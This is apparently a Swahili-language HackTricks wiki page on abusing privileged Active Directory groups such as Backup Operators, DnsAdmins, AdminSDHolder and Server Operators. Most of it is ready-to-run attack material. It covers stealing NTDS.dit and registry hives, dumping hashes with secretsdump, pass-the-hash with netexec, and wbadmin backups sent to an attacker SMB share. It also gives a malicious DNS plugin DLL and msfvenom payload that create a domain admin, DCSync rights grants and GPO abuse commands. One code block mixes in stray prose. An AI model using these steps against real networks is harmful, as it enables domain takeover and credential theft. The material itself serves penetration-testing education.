# Vikundi vyenye Haki za Juu

{{#include ../../banners/hacktricks-training.md}}

## Vikundi Vinavyojulikana vyenye Haki za Usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kimepewa uwezo wa kuunda akaunti na vikundi ambavyo si vya wasimamizi kwenye domain. Zaidi ya hayo, kinawezesha kuingia locally kwenye Domain Controller (DC).

Ili kutambua washiriki wa kikundi hiki, amri ifuatayo inatekelezwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwenye DC ndani ya mfumo.<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group's Access Control List (ACL) ni muhimu kwa sababu huweka ruhusa kwa "protected groups" zote ndani ya Active Directory, ikijumuisha makundi yenye privileges za juu. Utaratibu huu huhakikisha usalama wa makundi haya kwa kuzuia marekebisho yasiyoidhinishwa.

Mshambuliaji anaweza kutumia hali hii kwa kurekebisha ACL ya **AdminSDHolder** group na kumpa standard user ruhusa kamili. Hilo lingempa mtumiaji huyo udhibiti kamili wa protected groups zote. Ikiwa ruhusa za mtumiaji huyo zitabadilishwa au kuondolewa, zitawekwa tena kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.<sup>[[14]](#references)</sup>

Nyaraka za hivi karibuni za Windows Server bado zinachukulia baadhi ya makundi ya operator yaliyojengewa ndani kama objects **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, n.k.). Mchakato wa **SDProp** huendeshwa kwenye **PDC Emulator** kila baada ya dakika 60 kwa default, huweka `adminCount=1`, na huzima inheritance kwenye objects zilizolindwa. Hii ni muhimu kwa persistence na pia kwa kutafuta watumiaji wenye privileges ambao waliondolewa kwenye protected group lakini bado wanaendelea kuweka ACL isiyorithiwa.<sup>[[12]](#references)</sup>

Commands za kukagua members na kurekebisha permissions zinajumuisha:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Script inapatikana ili kuharakisha mchakato wa urejeshaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Uanachama katika group hili huruhusu kusoma objects za Active Directory zilizofutwa, jambo linaloweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Hii ni muhimu kwa **kurejesha njia za awali za privilege**. Objects zilizofutwa bado zinaweza kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs za zamani, au DN ya kundi la privilege lililofutwa ambalo baadaye linaweza kurejeshwa na operator mwingine.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umezuiwa isipokuwa mtumiaji awe sehemu ya kundi la `Server Operators`, jambo linalobadilisha kiwango cha ufikiaji.

### Privilege Escalation

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha ruhusa za services. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili wa services fulani, hivyo kuruhusu utekelezaji wa amri za kiholela na privilege escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inaonyesha kuwa `Server Operators` wana ufikiaji kamili, hivyo kuwezesha manipulation ya services kwa ajili ya kupata privileges zilizoinuliwa.

## Backup Operators

Uanachama katika kundi la `Backup Operators` hutoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na privileges za `SeBackup` na `SeRestore`. Privileges hizi huwezesha kupita kwenye folda, kuorodhesha na kunakili faili, hata bila permissions zilizoainishwa wazi, kwa kutumia flag ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.<sup>[[1]](#references)</sup>

Ili kuorodhesha washiriki wa kundi, tekeleza:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Shambulio la Kwenye Mfumo wa Ndani

Ili kutumia mapendeleo haya kwenye mfumo wa ndani, hatua zifuatazo hutumika:

1. Leta libraries zinazohitajika:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Washa na uthibitishe `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Fikia na unakili faili kutoka saraka zilizowekewa vikwazo, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Ufikiaji wa moja kwa moja wa mfumo wa faili wa Domain Controller huruhusu kuiba database ya `NTDS.dit`, ambayo ina hashes zote za NTLM za users na computers wa domain.

#### Using diskshadow.exe

1. Unda shadow copy ya drive ya `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwenye shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Vinginevyo, tumia `robocopy` kwa kunakili faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` kwa ajili ya kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hashes zote kutoka `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Baada ya extraction: Pass-the-Hash hadi DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Kutumia wbadmin.exe

1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi credentials za SMB kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kwa system backup na uchimbaji wa `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa maonyesho ya vitendo, tazama [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa group ya **DnsAdmins** wanaweza kutumia privileges zao kupakia DLL ya kiholela yenye privileges za SYSTEM kwenye seva ya DNS, ambayo mara nyingi huwekwa kwenye Domain Controllers. Uwezo huu huwezesha uwezekano mkubwa wa exploitation.

Ili kuorodhesha wanachama wa group ya DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Tekeleza DLL yoyote (CVE‑2021‑40469)

> [!NOTE]
> Vulnerability hii inaruhusu kutekelezwa kwa code yoyote yenye SYSTEM privileges katika huduma ya DNS (kwa kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka wa 2021.

Members wanaweza kuifanya DNS server ipakie DLL yoyote (iwe ndani ya kompyuta au kutoka kwenye remote share) kwa kutumia commands kama vile:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanzisha upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL ipakizwe:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu attack vector hii, rejelea ired.team.

#### Mimilib.dll

Pia inawezekana kutumia mimilib.dll kwa command execution, kwa kuibadilisha ili itekeleze commands maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins wanaweza kudhibiti DNS records ili kufanya mashambulizi ya Man-in-the-Middle (MitM) kwa kuunda WPAD record baada ya kuzima global query block list. Tools kama Responder au Inveigh zinaweza kutumiwa kwa spoofing na capturing network traffic.

### Event Log Readers
Members wanaweza kufikia event logs, na hivyo kupata taarifa nyeti kama plaintext passwords au maelezo ya command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Kundi hili linaweza kurekebisha DACLs kwenye domain object, na hivyo huenda likatoa DCSync privileges. Mbinu za privilege escalation zinazotumia kundi hili zimeelezwa kwa kina katika Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ikiwa unaweza kutenda kama mwanachama wa kundi hili, matumizi mabaya ya kawaida ni kumpa principal anayesimamiwa na mshambuliaji haki za replication zinazohitajika kwa [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Kihistoria, **PrivExchange** iliunganisha mailbox access, coerced Exchange authentication, na LDAP relay ili kufikia primitive hii hii. Hata pale ambapo relay path hiyo imezuiwa, uanachama wa moja kwa moja katika `Exchange Windows Permissions` au udhibiti wa Exchange server bado ni njia yenye thamani kubwa ya kupata domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators wana full access kwa Hyper-V, ambayo inaweza kutumiwa kupata udhibiti wa virtualized Domain Controllers. Hii inajumuisha ku-clone DCs zilizo hai na kutoa NTLM hashes kutoka kwenye faili la NTDS.dit.

### Mfano wa Exploitation

Abuse ya kivitendo kwa kawaida ni **offline access to DC disks/checkpoints** badala ya kutumia old host-level LPE tricks. Kwa access kwenye Hyper-V host, operator anaweza kuunda checkpoint au ku-export virtualized Domain Controller, ku-mount VHDX, na kutoa `NTDS.dit`, `SYSTEM`, pamoja na secrets nyingine bila kugusa LSASS ndani ya guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Kuanzia hapo, tumia tena workflow ya `Backup Operators` kunakili `Windows\NTDS\ntds.dit` na registry hives ukiwa offline.

## Group Policy Creators Owners

Kikundi hiki huwawezesha wanachama kuunda Group Policies kwenye domain. Hata hivyo, wanachama wake hawawezi kutumia group policies kwa users au groups, wala kuhariri GPOs zilizopo.

Nuance muhimu ni kwamba **creator huwa owner wa GPO mpya** na kwa kawaida hupata rights za kutosha za kuihariri baadaye. Hii inamaanisha kuwa kikundi hiki ni muhimu unapoweza:

- kuunda GPO hasidi na kumshawishi admin kui-link kwenye OU/domain lengwa
- kuhariri GPO uliyounda ambayo tayari ime-linkiwa mahali panapofaa
- ku-abuse delegated right nyingine inayokuwezesha ku-link GPOs, huku kikundi hiki kikikupa uwezo wa kuihariri

Kwa kawaida, abuse ya vitendo humaanisha kuongeza **Immediate Task**, **startup script**, **local admin membership**, au mabadiliko ya **user rights assignment** kupitia policy files zinazotegemea SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ikiwa unahariri GPO mwenyewe kupitia `SYSVOL`, kumbuka kuwa mabadiliko hayo hayatoshi peke yake: `versionNumber`, `GPT.ini`, na wakati mwingine `gPCMachineExtensionNames` lazima pia zisasishwe, la sivyo clients watapuuza policy refresh.<sup>[[9]](#references)</sup>

## Organization Management

Katika mazingira ambako **Microsoft Exchange** imedeployiwa, kuna group maalum linalojulikana kama **Organization Management** lenye capabilities muhimu. Group hili lina privileges za **ku-access mailboxes za domain users wote** na hudumisha **full control juu ya** Organizational Unit (OU) ya **'Microsoft Exchange Security Groups'**. Control hii inajumuisha group la **`Exchange Windows Permissions`**, ambalo linaweza kutumiwa kwa privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members wa group la **Print Operators** wamepewa privileges kadhaa, zikiwemo **`SeLoadDriverPrivilege`**, inayowaruhusu **kufanya log on locally kwenye Domain Controller**, kuizima, na kusimamia printers. Ili ku-exploit privileges hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya unelevated context, ni muhimu kubypass User Account Control (UAC).<sup>[[1]](#references)</sup>

Ili kuorodhesha members wa group hili, PowerShell command ifuatayo hutumika:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwenye Domain Controllers, group hii ni hatari kwa sababu default Domain Controller Policy inawapa **`SeLoadDriverPrivilege`** wanachama wa `Print Operators`. Ukipata token iliyoinuliwa ya mwanachama wa group hii, unaweza kuwezesha privilege hiyo na kupakia driver iliyosainiwa lakini iliyo hatarishi ili kufikia kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Kwa maelezo kuhusu kushughulikia token, angalia [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Wanachama wa group hii hupewa access ya kuingia kwenye PC kupitia Remote Desktop Protocol (RDP). Ili kuorodhesha wanachama hawa, PowerShell commands zinapatikana:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maarifa zaidi kuhusu exploiting RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Remote Management

Members wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Enumeration ya members hawa hupatikana kupitia:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa mbinu za exploitation zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kushauriwa.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwemo ruhusa za backup na restore, kubadilisha muda wa mfumo, na kuzima mfumo.<sup>[[1]](#references)</sup> Ili kuorodhesha wanachama, command iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Kwenye Domain Controllers, `Server Operators` kwa kawaida hurithi ruhusa za kutosha za **kusanidi upya au kuanzisha/kusimamisha services** na pia hupokea `SeBackupPrivilege`/`SeRestorePrivilege` kupitia sera chaguo-msingi ya DC. Kwa vitendo, hii huwafanya kuwa kiungo kati ya **service-control abuse** na **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ikiwa service ACL inaupa group hii haki za kubadilisha/kuzindua, elekeza service kwenye command yoyote, ianzishe kama `LocalSystem`, kisha rejesha `binPath` ya awali. Ikiwa udhibiti wa service umefungwa, tumia mbinu za `Backup Operators` zilizo hapo juu kunakili `NTDS.dit`.

## Marejeleo

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
